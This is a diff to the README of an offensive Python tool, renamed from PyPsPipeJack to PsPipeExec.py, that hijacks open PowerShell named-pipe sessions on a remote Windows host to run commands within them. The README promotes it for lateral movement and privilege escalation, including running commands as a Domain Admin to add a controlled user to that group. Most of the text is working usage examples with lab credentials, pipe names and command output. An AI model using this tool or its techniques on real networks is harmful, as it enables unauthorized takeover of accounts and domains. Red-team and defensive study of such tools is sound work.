@@ -1,13 +1,13 @@
-# PyPsPipeJack
+# PsPipeExec.py
 
-This tool is the continuation of my other tool, OpenPsPipeJack. This one is python based and works on Linux largely using Impacket.
+This tool is the continuation of my other tool, PsPipeExec.exe. This one is python based and works on Linux largely using Impacket.
 
 In summary, if you have local admin on a remote host, you can connect to remote PowerShell sessions on that host and execute commands within those PowerShell sessions. Not only does this provide lateral movement opportunities, but also privilege escalation opportunities. For example, if you get local admin access through something like RBCD, Shadow Credentials, etc and their is a Domain Admin on the remote host with a PowerShell session open, you can run commands as the domain admin and add a user you control to the Domain Admins group.
 
 ## Installation
 ```
-git clone https://github.com/e-fin/PyPsPipeJack.git
-cd PyPsPipeJack
+git clone https://github.com/e-fin/PsPipeExec.py.git
+cd PsPipeExec.py
 python3 -m venv .
 source bin/activate
 python3 -m pip install -r requirements
@@ -16,7 +16,7 @@ python3 -m pip install -r requirements
 ## Usage
 
 ```
-usage: PyPsPipeJack.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-port [destination port]] [--list] [--pipe PIPE] [--command COMMAND] [--script SCRIPT] target
+usage: PsPipeExec.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-port [destination port]] [--list] [--pipe PIPE] [--command COMMAND] [--script SCRIPT] target
 
 PowerShell Pipe Jacker
 
@@ -53,7 +53,7 @@ PowerShell Pipes:
 
 ### List Remote PSHost Pipes (Credentials)
 ```
-$ python3 PyPsPipeJack.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --list
+$ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --list
 
 PSHost pipes on target:
    PSHost.134296493751823186.13108.DefaultAppDomain.powershell
@@ -61,7 +61,7 @@ PSHost pipes on target:
 
 ### List Remote PSHost Pipes (Kerberos)
 ```
-$ python3 PyPsPipeJack.py -k -no-pass ws01.lab.local --list      
+$ python3 PsPipeExec.py -k -no-pass ws01.lab.local --list      
   
 PSHost pipes on target:
    PSHost.134296493751823186.13108.DefaultAppDomain.powershell
@@ -69,7 +69,7 @@ PSHost pipes on target:
 
 ### Connect to Remote PSHost Pipe (Credentials)
 ```
-$ python3 PyPsPipeJack.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --command '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'
+$ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --command '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'
 
 LAB\administrator
 
@@ -77,7 +77,7 @@ LAB\administrator
 
 ### Connect to Remote PSHost Pipe (Kerberos)
 ```
-$ python3 PyPsPipeJack.py -k -no-pass ws01.lab.local --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --command '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'
+$ python3 PsPipeExec.py -k -no-pass ws01.lab.local --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --command '[System.Security.Principal.WindowsIdentity]::GetCurrent().Name'
 
 LAB\administrator
 
@@ -85,7 +85,7 @@ LAB\administrator
 
 ### Connect to Remote PSHost Pipe INTERACTIVE
 ```
-$ python3 PyPsPipeJack.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell   
+$ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell   
 
 Connected. Enter PowerShell commands; 'exit' to quit.
 PS> whoami
@@ -104,7 +104,7 @@ echo hello2
 whoami
 ipconfig
 
-$ python3 PyPsPipeJack.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --script test.ps1
+$ python3 PsPipeExec.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell --script test.ps1
 
 hello
 hello2
